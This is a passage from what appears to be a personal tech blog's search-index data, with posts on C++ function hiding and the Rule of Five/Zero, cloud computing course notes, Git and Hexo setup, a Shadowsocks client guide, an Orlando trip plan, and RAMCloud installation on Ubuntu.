NULL; Derived* pDerived = NULL; Base b; Derived d; pBase = \u0026amp;b; pDerived = \u0026amp;d; Base* pBD = \u0026amp;d; const Base* pC = \u0026amp;d; const Base* const pCCP = \u0026amp;d; Base* const pCP = \u0026amp;d; int x = 5; Other o; float f = 3.1415926; b.f(); pBase-\u0026gt;f(); d.f(); pDerived-\u0026gt;f(); pBD-\u0026gt;f(); b.g(x); b.g(o); d.g(x); d.g(f); // Can't be compiled! // d.g(o); pBD-\u0026gt;g(x); pBD-\u0026gt;g(f); pC-\u0026gt;g(o); pCCP-\u0026gt;g(o); pCP-\u0026gt;g(o); return 0; }  在笔者Ubuntu 12.04 + gcc 4.6.3运行结果：\nBase::f()--20 //b.f()，通过对象调用，无虚特性，静态绑定 Base::f()--20 //基类指针指向基类对象，虽然是动态绑定，但没有使用到覆盖 Derived::f()--200 //d.f，通过对象调用，无虚特性，静态绑定 Derived::f()--200 //子类指针指向子类对象，虽然是动态绑定，但没有使用到覆盖 Derived::f()--20 //基类指针指向子类对象，动态绑定，子类f()覆盖基类版本。但函数参数默认值，是静态联编行为，pBD的类型是基类指针，所以使用了基类的参数默认值，注意此处！ Base::g(float)--5 //通过对象调用，int被提升为float Base::g(Other\u0026amp;) //没什么问题，基类中三个g函数之间的关系是重载 Derived::g(int)--5 //没什么问题 Derived::g(int)--3 //注意基类的g(float)已经被隐藏！所以传入的float参数调用的却是子类的g(int)方法！ Base::g(float)--5 //注意！pBD是基类指针，虽然它指向了子类对象，但基类中的所有g函数版本它是可见的！所以pBD-\u0026gt;g(5)调用到了g(float)！虽然产生了动态联编也发生了隐藏，但子类对象的虚表中，仍可以找到g(float)的地址，即基类版本！ Base::g(float)--3.14159 //原理同上 //d.g(o) //注意此处！再注意代码中被注释了的一行，d.g(o)不能通过编译，因为d是子类对象，在子类中，基类中定义的三个g函数版本都被隐藏了，编译时不可见！不会重载 Base::g(Other\u0026amp;) const //pC是指向const对象的指针，将调用const版本的g函数 Base::g(Other\u0026amp;) const //pCCP是指向const对象的const指针，也调用const版本的g函数 Base::g(Other\u0026amp;) //pCP是指向非cosnt对象的const指针，由于不指向const对象，调用非const版本的g函数  上述结果，是否和预想的是否又有些出入呢？问题主要集中于结果的第5、12、13和15行。\n第5行输出结果证明：当函数参数有默认值，又发生多态行为时，函数参数默认值是静态行为，在编译时就已经确定，将使用基类版本的函数参数默认值而不是子类的。\n而第12、13、15行输出结果则说明，尽管已经证明我们之前说的隐藏是正确的（因为d.g(o)不可以通过编译，确实发生了隐藏），但却可以**利用基类指针指向派生类对象后，来绕开这种限制！**也就是说，编译器根据参数匹配函数原型的时候，是在编译时根据指针的类型，或对象的类型来确定，指针类型是基类，那么基类中的g函数版本就是可见的；指针类型是子类，由于发生了隐藏，基类中的g函数版本就是不可见的。而到动态绑定时，基类指针指向了子类对象，在子类对象的虚函数表中，就可以找到基类中g虚函数的地址。\n写到这里，不知道读者是否已经明白，这些绕来绕去的关系。在实际代码运用中，可能并不会写出含有这么多“陷阱”的测试代码，我们只要弄清楚重载、覆盖和隐藏的具体特征，并头脑清醒地知道，我现在需要的是哪一种功能（通常也不会需要隐藏），就能写出清析的代码。上面的代码其实是一个糟糕的例子，因为在这个例子中，重载、覆盖、隐藏并存，我们编写代码，就是要尽可能防止这种含混不清的情况发生。\n记住一个原则：每一个方法，功能和职责尽可能单一，否则，尝试将它拆分成为多个方法。\n","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"3e91af00de70b860e8d89a9031c782ab","permalink":"http://www.guozet.me/post/C++-Rule-Of-Five/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/C++-Rule-Of-Five/","section":"post","summary":"Rule of five Because the presence of a user-defined destructor, copy-constructor, or copy-assignment operator prevents implicit definition of the move constructor and the move assignment operator, any class for which","tags":"C++","title":"C++之Rule of Five","type":"post"},{"authors":null,"categories":"C++","content":"Classes that have custom destructors, copy/move constructors or copy/move assignment operators should deal exclusively with ownership (which follows from the Single Responsibility Principle). Other classes should not have custom destructors, copy/move constructors or copy/move assignment operators. [1]\nclass rule_of_zero { std::string cppstring; public: rule_of_zero(const std::string\u0026amp; arg) : cppstring(arg) {} };  When a base class is intended for polymorphic use, its destructor may have to be declared public and virtual. This blocks implicit moves (and deprecates implicit copies), and so the special member functions have to be declared as defaulted [2]\nclass base_of_five_defaults { public: base_of_five_defaults(const base_of_five_defaults\u0026amp;) = default; base_of_five_defaults(base_of_five_defaults\u0026amp;\u0026amp;) = default; base_of_five_defaults\u0026amp; operator=(const base_of_five_defaults\u0026amp;) = default; base_of_five_defaults\u0026amp; operator=(base_of_five_defaults\u0026amp;\u0026amp;) = default; virtual ~base_of_five_defaults() = default; };  however, this can be avoided if the objects of the derived class are not dynamically allocated, or are dynamically allocated only to be stored in a std::shared_ptr (such as by std::make_shared): shared pointers invoke the derived class destructor even after casting to std::shared_ptr\u0026lt;Base\u0026gt;.\n","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"8dce5be466c1bc79b84ff4c43684b846","permalink":"http://www.guozet.me/post/C++-Rule-of-Zero/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/C++-Rule-of-Zero/","section":"post","summary":"Classes that have custom destructors, copy/move constructors or copy/move assignment operators should deal exclusively with ownership (which follows from the Single Responsibility Principle). Other classes should not have custom destructors,","tags":"C++","title":"C++之Rule of Zero","type":"post"},{"authors":null,"categories":"CPSC8270","content":"Quiz 1 Date: 09/06/2018\nSome questions about the paper   What is grammarware? Grammarware comprises grammars and grammar-dependent software.\n  What is Chomskys controversial definition of the “universal grammar?” He think that the essence of human language is the system of principles, conditions, and rules that are elements or properties of all human languages.\n  Basically, what’s the “research agenda” described in the paper? It promotes an engineering discipline for grammarware.\n  The authors claim that “Grammarware seems to be second-class software.” What do they mean by this? (talk about refactoring) Grammarware seems to be second-class software. For instance, program refactoring is a well-established practice according to modern object-oriented methodology. By contrast, grammar refactoring is weakly understood and hardly practiced.\n  The authors ask the question: “what is a good grammar?” How would you address this issue? A good grammar can help programmers to automate many tasks that are tedious and error prone when performed manually. Can help the programmers to find each set of string in the computer languages.\n  Def: Formally, a grammar G is a four tu-ple (N, T, S, P) where N \u0026amp; T are disjount sets of symbols known as non-terminals and terminals, S ∈ N is the start symbol, and P is a relation on N ∪ T of production rules.\n  N : non-terminals are generally represented as cap letters, and do not appear in the language; they are used to derive sentences in the language.\n  T : terminals are symbols in the language\n  S is one of the non-terminals that indicates where to start when deriving a sentence in the language.\n  P : rules used to derive a sentence.\n  ","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"65a06040230af65f4ebd1470994e6c21","permalink":"http://www.guozet.me/post/CPSC8270-Quiz1/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/CPSC8270-Quiz1/","section":"post","summary":"Quiz 1 Date: 09/06/2018 Some questions about the paper What is grammarware? Grammarware comprises grammars and grammar-dependent software. What is Chomskys controversial definition of the “univ","tags":null,"title":"编译原理---编译器概念","type":"post"},{"authors":null,"categories":"Courses","content":"8/23/2018\n Welcome, course overview, account setup, course logistics (20 minutes) 1.01 What is Cloud Computing (30 minutes) AWS Management Console demo Access the student materials at https://awsacademy.qwiklab.com (Links to an external site.)Links to an external site. Registration link \u0026ndash; will be provided in email to class participants  AWS Getting Started (Links to an external site.)Links to an external site.  Homework:\n AFTER EVERY LECTURE: Do the assessment(s) associated with the lecture slides just covered even if not listed in the Homework. Become familiar with the terms and concepts listed for each class period. For today\u0026rsquo;s lecture, do the Assessment for Lecture 1. Read Cloud computing basics (Links to an external site.)Links to an external site. Read: Taxonomy and Survey of Cloud Computing Systems (Links to an external site.)Links to an external site. and be prepared to answer questions about it on the Exam. Some terms everyone should know: on-demand self service, resource pooling, elasticity, measured service, SAAS, PAAS, IAAS, HAAS public/private/hybrid types of clouds, virtualization, hypervisor, stateful versus stateless services, cloud business model, on-premises/on-prem, enterprise application, pay as you go  Introduce What is the Cloud Computing? Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\nSome keywords Five Characteristics On-demand self-service\nThis means provisioning or de-provisioning computing resources as needed in an automated fashion without human intervention [n. 介入；调停；妨碍]. An analogy to this is electricity as a utility where a consumer can turn on or off a switch on-demand to use as much electricity as required.\nResource Pooling\nThis means that computing resources are pooled to meet the demand of the consumers so that resources (physical or virtual) can be dynamically assigned, reassigned or de-allocated as per the requirement. Generally the consumers are not aware of the exact location of computing resources. However, they may be able to specify location (country, city, region and the like) for their need. For example, I as a consumer might want to host my services with a cloud provider that has cloud data centers within the boundaries of Australia.\nUbiquitous[adj. 普遍存在的；无所不在的] network access\nThis means that computing facilities can be accessed from anywhere over the network using any sort of thin or thick clients (for example smartphones, tablets, laptops, personal computers and so on).\nElasticity\nCloud computing provides an illusion of infinite computing resources to the users. In cloud models, resources can be elastically provisioned or released according to demand.\nMeasured service\nThis means that consumers only pay for the computing resources they have used. This concept is similar to utilities like water or electricity.\n Three main service models of cloud computing (Cloud Architecture) XaaS offerings where X is Software, Hardware, Platform, Infrastructure, Data, Business etc.\nSAAS\nSoftware as a service (SaaS). Applications hosted by a provider on a cloud infrastructure are accessed from thin or thick clients over the network or a program interface (for example, web services). Examples are Google Docs, IBM SmartCloud Docs, IBM SmartCloud Meetings, Saleforce.com’s CRM application and so on.\nPAAS\nPlatform as a service (PaaS). Providers deliver not only infrastructure but also middleware (databases, messaging engines and so on) and solution stacks for application build, development and deploy. IBM SmartCloud Application Services and Google App Engine are two examples of PaaS.\nIAAS\nInfrastructure as a service (IaaS). It is the delivery of computing infrastructure as a service. IBM SmartCloud Enterprise+, SoftLayer cloud and Amazon EC2 are some examples of IaaS.\nHAAS\nHardware as a service (HaaS) refers to managed services or grid computing, where computing power is leased from a central provider. In each case, the HaaS model is similar to other service-based models, where users rent, rather than purchase, a provider\u0026rsquo;s tech assets.\nThere are others services emanating from these main services. Storage as a service (STaaS) and communications as a service (CaaS) are two such variants.\nFour cloud deployment models( public/private/hybrid types of clouds) Public cloud\nThis is where computing resources provided by a cloud provider are used by different organizations through public Internet on a pay as you go (PAYG) model. Cloud providers ensure some sort of separation for resources used by different organizations. This is known as multitenancy [n. 多租户技术].\nPrivate cloud\nThis is where cloud infrastructure is solely owned by an organization and maintained either by this organization or a third party and can be located on site or off-site. Computing resources are behind the corporate firewall.\nCommunity cloud\nHere, cloud infrastructure is owned and shared by multiple organizations with a shared concern.\nHybrid cloud\nIt is the combination of any type of cloud model mentioned above connected by standardized or proprietary technology.\nVirtualization Virtualization Management is the technology that abstracts the coupling between the hardware and operating system. It refers to the abstraction of logical resources away from their underlying physical resources in order to improve agility, flexibility, reduce costs and thus enhance busines valuse. Basically virtualizations in cloud are of different types such as server virtualization, storage virtuualization and network virtualization.\nFor example, a common interpretation of server virtualization is the mapping of single physical resources to multiple logical representations or partitions.\nHypervisor We’ve heard the term hypervisor, of course, when talking of virtualization and the Cloud. Hypervisors allow a single set of physical hardware to host multiple virtual machines, and hold all of the necessary variables and information required to make those virtual machines work. But what is a Hypervisor actually, what does a Hypervisor do, and how does it make the Cloud possible? Let’s have a look:\nIn their simplest form, hypervisors are software, specialized firmware, or both which allow physical hardware to be shared across multiple virtual machines. The way the hypervisor does this will vary from vendor to vendor – like ESXi from WMware or Hyper-V from Microsoft, but they all accomplish the same task. Each takes one set of physical hardware (CPU, RAM, disk drives, peripherals, etc.) and allows it to be simultaneously used by multiple instances of Operating Systems (Windows, Linux, etc.).\nThere are two major classifications of hypervisors to be aware of. Type 1 and Type 2 both do the same basic task, but the way they do it is quite different from each other.\nstateful versus stateless services I assume you are referring to Security Groups (stateful) and Access Control Lists (stateless) in Ryan\u0026rsquo;s videos. My understanding is:\nSecurity Groups control connectivity to and from an EC2 instance or instances whereas ACLs control connectivity to and from a subnet.\nStateful = any connection inbound will also allow the response to be returned outbound without additional rules or will override an explicit DENY.\nStateless = you must explicitly ALLOW traffic in both directions.\ncloud business model on-premises/on-prem On-premises software (sometimes misspelled \u0026ldquo;on-premise\u0026rdquo; or abbreviated as \u0026ldquo;on-prem\u0026rdquo;) is installed and runs on computers on the premises (in the building) of the person or organization using the software, rather than at a remote facility such as a server farm or cloud. On-premises software is sometimes referred to as “shrinkwrap” software, and off-premises software is commonly called “software as a service” (\u0026ldquo;SaaS\u0026rdquo;) or “cloud computing”.\nenterprise application Enterprise application integration is an integration framework composed of a collection of technologies and services which form a middleware or \u0026ldquo;middleware framework\u0026rdquo; to enable integration of systems and applications across an enterprise.\npay as you go Pay-as-you-go cloud computing (PAYG cloud computing) is a payment method for cloud computing that charges based on usage. The practice is similar to that of utility bills, using only resources that are needed.\nSome websites links There are some courses on this website. - AWS Training\n AWS lab: awsacademy.qwiklabs.com Use lab on this website   Aws Core services Elastic Load Balancing, Amazon CloudWatch, and Auto Scaling.\nElastic Load Balancing(ELB)\u0026ndash; Traffic cop(交通警察) ELB can automatically distributes incoming application traffic across multiple targets(Like Amazon EC2 Instances, Containers, and IP address).\nHow to distribute traffic across ELB Auto Scaling to launch and release servers How CloudWatch enables you to monitor AWS resources and applications in real time.","date":1535364871,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1535364871,"objectID":"581781e2ed694bb5be2a288738111c04","permalink":"http://www.guozet.me/post/Cloud-Computing-introduce/","publishdate":"2018-08-27T10:14:31Z","relpermalink":"/post/Cloud-Computing-introduce/","section":"post","summary":"8/23/2018\n Welcome, course overview, account setup, course logistics (20 minutes) 1.01 What is Cloud Computing (30 minutes) AWS Management Console demo Access the student materials at https://awsacademy.qwiklab.com (Links to an external site.)Links to an external site. Registration link \u0026ndash; will be provided in email to class participants  AWS Getting Started (Links to an external site.)Links to an external site.  Homework:\n AFTER EVERY LECTURE: Do the assessment(s) associated with the lecture slides just covered even if not listed in the Homework. Become familiar with the terms and concepts listed for each class period. For today\u0026rsquo;s lecture, do the Assessment for Lecture 1. Read Cloud computing basics (Links to an external site.)Links to an external site. Read: Taxonomy and Survey of Cloud Computing Systems (Links to an external site.)Links to an external site. and be prepared to answer questions about it on the Exam. Some terms everyone should know: on-demand self service, resource pooling, elasticity, measured service, SAAS, PAAS, IAAS, HAAS public/private/hybrid types of clouds, virtualization, hypervisor, stateful versus stateless services, cloud business model, on-premises/on-prem, enterprise application, pay as you go  Introduce What is the Cloud Computing? Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\n","tags":"Cloud Computing","title":"Courses Cloud Computing Introduce 1","type":"post"},{"authors":null,"categories":"vpn","content":"Shadowsocks使用教程 浏览器插件 依然记得自己使用「红杏」的畅快体验──哪个网站不能访问了，按下图标添加到规则列表中，就可以「科学」地访问了。这种无缝的体验，靠 Shadowsocks 加另一款 Chrome 扩展 SwitchyOmega 也能实现，这里是 使用教程。\nWindows桌面应用 部署 Shadowsocks 完成后，浏览器就能实现科学上网了，但是像 Dropbox 等桌面应用的流量，还不能由 Shadowsocks 来代理。要实现桌面应用的代理，需要再借助其他应用，比如 Proxifier、 Surge for Mac。\n手机端应用 安卓手机只需要下载安装 Shadowsocks 安卓版，并与桌面版一样，填入服务器 IP、端口、密码和加密方式，就可以设置全局或分应用代理。但是要实现「真正意义上」的 PAC 规则的话（也就是自定义哪些域名走代理、哪些不走），目前似乎还没有一个便捷可行的解决方案。\niOS 可以通过类 Surge 的 App 实现 PAC 规则下的自动翻墙。\nSurge 目前定价 328 元，另有 Mac 版（另外收费）。作为一款兼具「科学上网」功能的网络开发调试利器，它完全值这个价。觉得太贵的话，可以使用相对便宜的 Wingy 或者 Potatso，不过二者都没有前者来得稳定好用。\n","date":1535040871,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1535040871,"objectID":"49b5d1834691ba80b74d1532ca172779","permalink":"http://www.guozet.me/post/vpn-client/","publishdate":"2018-08-23T16:14:31Z","relpermalink":"/post/vpn-client/","section":"post","summary":"Shadowsocks使用教程 浏览器插件 依然记得自己使用「红","tags":"vpn","title":"vpn-Shadowsocks使用教程","type":"post"},{"authors":null,"categories":"Leetcode","content":"I have solved SOLVEDNUMBER / 1020 problems. I use this page to record the questions which I did on the Leetcode.\nLast Updated: UPDATETIMESTAMP\nPlease access my Leetcode Gitbook to git all posts about leetcode.\n This table include: Question Number, Questions Name, Question Difficulty, Question Type, And when I did it.\n  table th:nth-of-type(1) { width: 45px; } table th:nth-of-type(2) { width: 50%; }     # Title Difficulty Topics   ","date":1534467759,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1534467759,"objectID":"d832c2b44aff1b1b246f3dad7f4bde97","permalink":"http://www.guozet.me/post/All-Leetcode/","publishdate":"2018-08-17T01:02:39Z","relpermalink":"/post/All-Leetcode/","section":"post","summary":"I have solved SOLVEDNUMBER / 1020 problems. I use this page to record the questions which I did on the Leetcode.\nLast Updated: UPDATETIMESTAMP\nPlease access my Leetcode Gitbook to git all posts about leetcode.\n This table include: Question Number, Questions Name, Question Difficulty, Question Type, And when I did it.\n  table th:nth-of-type(1) { width: 45px; } table th:nth-of-type(2) { width: 50%; } ","tags":"Leetcode","title":"Leetcode Solutions(Updating)","type":"post"},{"authors":null,"categories":"Blog","content":" 很多时候我们是需要在不同的电脑上面书写我们的博客，但是每次都要配置Hexo的环境的话，这就是一件非常崩溃的事情，所以我们需要利用我们的知识完成自动化部署。\n 原理： 在github上面创建Blog的repo, 使用master分支作为博客分支，使用hexo来作为源文件保存分支，将该repo的token key 提供给Travis之后，Travis CI平台检测你的hexo分支数据变化的时候，就会执行你定义的脚本。（在这个脚本中，完成博客发布的内容）\n使用Travis CI 2018-08-09-hexo-and-travisci-to-implement-auto-setting_2018-08-09-14-36-40.png\n","date":1533824054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533824054,"objectID":"846cee2cb2d5d48a49e1360260b2750e","permalink":"http://www.guozet.me/post/hexo-and-travisci-to-implement-auto-setting/","publishdate":"2018-08-09T14:14:14Z","relpermalink":"/post/hexo-and-travisci-to-implement-auto-setting/","section":"post","summary":"很多时候我们是需要在不同的电脑上面书写我们的博客，但是每次都","tags":["Hexo","Github","Travis"],"title":"Hexo+Github+Travis CI完成博客的自动部署","type":"post"},{"authors":null,"categories":"Git","content":"Git command Branch operation  Background: We often want the copy the master branch(or other branch) to develop a new function.  $git checkout master //Change to the master branch or which branch you want to copy\r$git pull //从远端拉取最新版本\r$git checkout -b NewBranch //Switched to a new branch 'NewBranch'\r$git push origin NewBranch //新建分支NewBranch到远端\r Issues git pull error $git pull\rThere is no tracking information for the current branch.\rPlease specify which branch you want to merge with.\rSee git-pull(1) for details.\rgit pull \u0026lt;remote\u0026gt; \u0026lt;branch\u0026gt;\rIf you wish to set tracking information for this branch you can do so with:\rgit branch --set-upstream-to=origin/\u0026lt;branch\u0026gt; NewBranch\r solution $git branch --set-upstream-to=origin/NewBranch $git pull $git push origin test:test\nGit configure on Ubuntu Add git branch name if its present Open ~/.bashrc file, add the code followed this paragraph after the default prompt definition and unset color_prompt force_color_prompt. You also can replace the the default prompt definition with the snippet or leave your ~/.bashrc as it is and comment the default prompt definition along with unset color_prompt force_color_prompt.\n# Add git branch if its present to PS1\rparse_git_branch() {\rgit branch 2\u0026gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/'\r}\rif [ \u0026quot;$color_prompt\u0026quot; = yes ]; then\rPS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[01;31m\\]$(parse_git_branch)\\[\\033[00m\\]\\$ '\relse\rPS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w$(parse_git_branch)\\$ '\rfi\r replace\nif [ \u0026quot;$color_prompt\u0026quot; = yes ]; then\rPS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\relse\rPS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\rfi\r Which ends with:\nunset color_prompt force_color_prompt\r","date":1533822130,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533822130,"objectID":"2939ffff39047dff52d4b7e687354823","permalink":"http://www.guozet.me/post/How-to-config-git-on-Ubuntu/","publishdate":"2018-08-09T13:42:10Z","relpermalink":"/post/How-to-config-git-on-Ubuntu/","section":"post","summary":"Git command Branch operation  Background: We often want the copy the master branch(or other branch) to develop a new function.  $git checkout master //Change to the master branch or which branch you want to copy\r$git pull //从远端拉取最新版本\r$git checkout -b NewBranch //Switched to a new branch 'NewBranch'\r$git push origin NewBranch //新建分支NewBranch到远端\r","tags":"Git","title":"How to config git on Ubuntu","type":"post"},{"authors":null,"categories":"Travel","content":"这次很早就计划了八月份到奥兰多的旅行，正好这段时间我在暑期课程和秋季课程的中间空闲时间，她也使用两天病假，这样我们可以在奥兰多有完整的三天可以游玩了。\n行程安排 我们在奥兰多的游玩时间只有三天，第一天游玩迪斯尼Magic Kingdom Pack ，后面两天游玩Universal Studios \u0026amp; Islands of Adventure 。\n   时间 行程     D1(23:30,08/10) 抵达奥兰多机场(我从Atlanta -\u0026gt; Orlando, 她从Hartford-\u0026gt;Orlando))   D2(08/11) 迪斯尼Magic Kingdom Pack   D3(08/12) Universal Studios \u0026amp; Islands of Adventure   D4(08/13) Universal Studios \u0026amp; Islands of Adventure   D5(07:30,08/14) 离开奥兰多    旅行前的准备 门票购买 迪斯尼的门票在官网购买即可，我们选择的是Magic kingdom pack, 选择这个的原因主要是女朋友比较喜欢米奇，然后我们对太小孩子的园区并不感兴趣。环球影城我们选择了Universal studios 和Islands of Adventure park的Two days 2-parks tickets.因为我们很想去体验能够连接两个岛的小火车。\n Tips: 我们的universal studio 的 Two days 2-pars ticket是在飞猪上去购买的，比官网每张票便宜40刀左右. 另外过迪斯尼的APP领取三个fast pass, 能够选择三个项目，然后无需等待就能够玩项目，使用完三个Fast pass之后可以继续领取一个fast pass，但是最多不能够超过4个 Fast Pass\n 酒店 我们在\n地图  Magic Kingdom Maps\nDisney Theme Park Maps\n迪斯尼魔术王国(Disney Magic Kindom)一天行程 项目游玩安排 在这里记录我们亲自去尝试过的项目 | 项目 | 介绍 | 推荐指数 | | :\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; | :\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;- | :\u0026mdash;\u0026mdash;- | | Tomorrowland Speedway(Tomorrowland) | 固定的几个赛车道，可以在里面开赛车，速度并不是很快，但是可以后面的车撞前面的车，这是比较爽的 | 3+ | | Space Mountain(Tomorrowland) | 室内过山车，比较火爆，我们使用了Fast Pass | 4+ | | Buzz Lightyear\u0026rsquo;s Space Ranger Spin(Tomorrowland) | 巴斯光年射击游戏, 感觉不是很好玩 | 3 | | Prince Charming Regal Carrousel(Tomorrowland) | 旋转木马 | 2 | | Space Mountain(Tomorrowland) | 室内过山车，比较火爆，我们使用了Fast Pass | 4+ | | Buzz Lightyear\u0026rsquo;s Space Ranger Spin(Tomorrowland) | 巴斯光年射击游戏, 感觉不是很好玩 | 3 |\n推荐Buzz Lightyear's Space Ranger spin,这是一个射击类游戏，但是两个人玩是比较有意思的;另外Space Mountain非常刺激，虽然是室内过山车，但是感觉很棒。\n迪斯尼推荐餐厅 根据这两天在外吃饭的体会，迪斯尼里面餐厅的整体价格还算比较正常，快餐的话人均花费大致在15-25刀一餐，由于我们没有提前预订餐厅，所以我们只能在里面吃快餐了。餐厅推荐：\n环球影城(Day 1) 游玩项目清单 Universal Studio Florida    项目(位置) 介绍 推荐指数     Despicable Me Minion(Production Central) 小黄人电影，推荐一早进园就去看，排队的人比较少 5+   Shrek 4-D 史莱克的4D电影，但是感觉没有小黄人精彩 3   Hollywood rip ride Rocket 强烈推荐，90度直上，然后连续几个360度的旋转，而且可以选择在过山车上面听的音乐，坐过的最刺激的过山车 5+   Transformers the Ride-3D 变形金刚的3D，非常的精彩，感觉是在和变形金刚共同战斗 5+   Revenge of the Mummy 室内过山车项目，木乃伊主题，非常刺激，效果很赞 5   Men in Black alien attack 打外星人的射击类游戏，个人感觉一般，和迪斯尼的巴斯光年类似 3   The Simpsons ride 辛普森的一家，室内3D, 体验很不错 5   E.T advanture 自行车模样的游览车，没意思 3    Islands of Adventure    项目(位置) 介绍 推荐指数     The incredible hunk Coaster(Super hero island) 绿巨人过山车，很喜欢刚开始加速冲出去的感觉，很刺激 5+   Stom Force acelatron 坐在里面，不停转动的圆形机器，头晕，无聊 2   The amazing adventures of spider-man 3D模拟情景类，跟着蜘蛛侠各种打怪兽 5+   Dudley do-right Ripsaw falls 激流勇进，最后一下可能会湿衣服，但是整体还行，不用存包，衣服不会湿透 5+   Harry potter and the Forbidden journey 超级火爆，不能使用express,推荐进园就来这里先玩这个 5   Fight of the hippogriff 小型过山车，坐过绿巨人之后，就会觉得这个很无聊了 3   Doctor Doom\u0026rsquo;s fearfall(跳楼机，没有玩) 在室外，高度有点恐怖，没有玩 5+(博客推荐)   ","date":1533822130,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533822130,"objectID":"7ea8f7f1beca86d7a865743c2ad6394a","permalink":"http://www.guozet.me/post/Orlando-travel/","publishdate":"2018-08-09T13:42:10Z","relpermalink":"/post/Orlando-travel/","section":"post","summary":"这次很早就计划了八月份到奥兰多的旅行，正好这段时间我在暑期课程和秋季课程的中间空闲时间，她也使用两天病假，这样我们可以在奥兰多有完整的三天可以游玩了。\n行程安排 我们在奥兰多的游玩时间只有三天，第一天游玩迪斯尼Magic Kingdom Pack ，后面两天游玩Universal Studios \u0026amp; Islands of Adventure 。\n   时间 行程     D1(23:30,08/10) 抵达奥兰多机场(我从Atlanta -\u0026gt; Orlando, 她从Hartford-\u0026gt;Orlando))   D2(08/11) 迪斯尼Magic Kingdom Pack   D3(08/12) Universal Studios \u0026amp; Islands of Adventure   D4(08/13) Universal Studios \u0026amp; Islands of Adventure   D5(07:30,08/14) 离开奥兰多   ","tags":"Travel","title":"奥兰多旅行记录[3日]","type":"post"},{"authors":null,"categories":"Network","content":"Introduce  RAMCloud is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:\nProject Link: RAMCloud\nOffice Installing introduce: General Information for Developers\nI have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.\n Github repo Link: RAMCloud For Ubuntu16.04 Bitbucket repo Link: RAMCloud For Ubuntu16.04  If you have some issue with this script, please send email to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.\n Installing Ramcloud on Ubuntu16.04 Necessary Tools  GNU Make (Anything reasonably recent) GNU g++ (4.9.x) git (\u0026gt;= 1.6.0) Perl (Anything reasonably recent)  For mergedeps.pl, which automatically inserts included headers in source files into the make dependencies.   Python 2.6, epydoc Boost  If you\u0026rsquo;re having issues with Boost on Ubuntu, check boost ticket #3844.   pcre Doxygen 1.7.1 protocol buffers  If you\u0026rsquo;re getting lots of undefined reference errors during linking, it\u0026rsquo;s likely that your libprotobuf is compiled with a different library ABI than RAMCloud. Check GCC\u0026rsquo;s Dual ABI page and the \u0026ldquo;GLIBCXX_USE_CXX11_ABI\u0026rdquo; flag in GNUMakefile.   ZooKeeper java and javac (\u0026gt;= 1.7.0_25)  If your system is Ubuntu 15.04 or 14.04, then you can just use this command to install these packets in your system.\napt-get install build-essential git-core doxygen=1.7.1 libpcre3-dev protobuf-compiler libprotobuf-dev libcrypto++-dev libevent-dev libboost-all-dev libgtest-dev libzookeeper-mt-dev zookeeper libssl-dev  Analyze I can\u0026rsquo;t use this command to work on the Ubuntu 16.04. In addtion, I hope I can use the RAMCloud on any Ubuntu system. It means that it should be worked on Ubuntu 16.04 or 18.04. So I need to compile these packet by g++ or gcc or Cmake.\n Install Dependency Install build-essential, libssl-dev and git We can get these two libs on Ubuntu 16.06 or 18.04. So we just need to use apt-get to get these lib.\nsudo apt-get -y build-essential libssl-dev git  Install gcc/g++ 4.9 The RAMCloud source code used some features in the C++11 Standard. As a result, we need to make sure the gcc/g++ version have support the C++11 Standard. Then we choose the gcc/g++ 4.9 to install. Please follow the commands.\nsudo apt-get install -y software-properties-common sudo add-apt-repositocry -y ppa:ubuntu-toolchain-r/test sudo apt-get update mv /usr/bin/gcc /usr/bin/gcc.bak mv /usr/bin/g++ /usr/bin/g++.bak sudo apt-get install -y gcc-4.9 sudo apt-get install -y g++-4.9 lnif /usr/bin/g++-4.9 /usr/bin/g++ lnif /usr/bin/gcc-4.9 /usr/bin/gcc g++ -v gcc -v  If the g++ -v command can output the information like the followed graph. Then it means that you have installed the g++ 4.9 correctly.\nIf the gcc -v command can output 